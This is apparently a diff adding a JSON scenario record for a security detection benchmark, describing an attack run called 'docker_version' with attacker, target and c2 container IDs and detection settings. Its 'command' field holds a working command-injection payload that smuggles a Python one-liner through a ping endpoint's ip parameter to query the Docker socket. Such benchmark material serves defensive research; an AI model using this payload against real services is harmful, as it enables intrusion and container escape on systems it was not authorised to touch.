@@ -1,0 +1,19 @@
+{
+  "scenario_id": "docker_version",
+  "kind": "attack",
+  "repeat_id": 2,
+  "driver_role": "attacker",
+  "driver_container_name": "drsec-bench-docker_version-r02-attacker",
+  "driver_container_id": "51ec1b5cda077acb96ca8b65719e429183a82ec3fd04779c24f292e7b429420e",
+  "target_container_id": "2cbeef161d994b391988ce10a8481cc1819f15b3c7c024bb7329b6d453388c07",
+  "target_dsock_container_id": "5a2f6acc5663aca5a906570d3c6eed4dfeaad0e9cf66e07e7f1912a58b144922",
+  "c2_container_id": "fe37c6cec56828a9659e24f759f211441eb089da8a08582c2713590d788854b8",
+  "trace_out": "/home/yzx/DRSEC_v2/data/benchmarks/docker_version/repeat_02/trace.log",
+  "windows_dir": "/home/yzx/DRSEC_v2/data/benchmarks/docker_version/repeat_02/windows",
+  "metrics_path": "/home/yzx/DRSEC_v2/data/benchmarks/docker_version/repeat_02/metrics.json",
+  "window_seconds": 10,
+  "threshold": 0.5,
+  "max_windows": 0,
+  "command": "set -eu; curl -sG 'http://vuln-app-dsock:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /version HTTP/1.0\\\\r\\\\nHost: docker\\\\r\\\\n\\\\r\\\\n'); print(s.recv(4096).decode(\\\\\\'utf-8\\\\\\', \\\\\\'ignore\\\\\\'))\\\"\" >/dev/null; sleep 2",
+  "duration_seconds": 10
+}
